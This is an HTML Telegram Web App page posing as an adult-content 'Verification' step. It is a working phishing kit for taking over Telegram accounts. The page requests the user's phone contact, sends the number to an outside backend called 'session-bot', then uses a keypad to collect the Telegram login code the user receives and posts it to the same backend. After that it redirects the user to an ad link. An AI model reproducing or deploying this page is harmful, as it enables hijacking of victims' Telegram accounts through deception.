<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; margin: 0; padding: 0; background: url('https://files.catbox.moe/p9p33p.jpg') center/cover fixed; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .box { background: rgba(255, 255, 255, 0.9); padding: 20px; border-radius: 20px; width: 320px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .btn-start { background: #ff4757; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
        .btn-code { background: #3f9e9e; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; margin-bottom: 15px; cursor: pointer; }
        .otp-display { width: 100%; padding: 10px; margin: 10px 0; border: 2px solid #ccc; border-radius: 8px; font-size: 24px; text-align: center; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
        .key { background: #4caf50; padding: 15px; border-radius: 8px; font-size: 20px; font-weight: bold; color: white; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <!-- ধাপ ১ -->
    <div class="box" id="step1">
        <button class="btn-start" onclick="startFlow()">🍓 START CONTINUE 🔞</button>
    </div>

    <!-- ধাপ ২: ওটিপি ও কিপ্যাড -->
    <div class="box hidden" id="step2">
        <button class="btn-code" onclick="tg.openTelegramLink('https://t.me/Telegram')">🔞 GET CODE 🔞</button>
        <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
        <div class="keypad">
            <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
            <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
            <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
            <div class="key" style="background:#ffc107" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key" style="background:#0088cc" onclick="verifyOTP()">OK</div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let currentOTP = "";

        function startFlow() {
            tg.requestContact();
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") {
                    sendNumber(data.phone);
                } else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumber(phone) {
            const res = await fetch(`${BACKEND_URL}/send_number`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: userId, phone: phone })
            });
            const data = await res.json();
            if (data.status === "success") {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            }
        }

        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }

        async function verifyOTP() {
            if(currentOTP.length < 5) return alert("Enter 5 digits!");
            const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: userId, otp: currentOTP })
            });
            const data = await res.json();
            if (data.status === "success") { window.location.href = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446"; }
            else { alert("Invalid Code!"); currentOTP = ""; document.getElementById("otp_display").value = ""; }
        }
    </script>
</body>
</html>
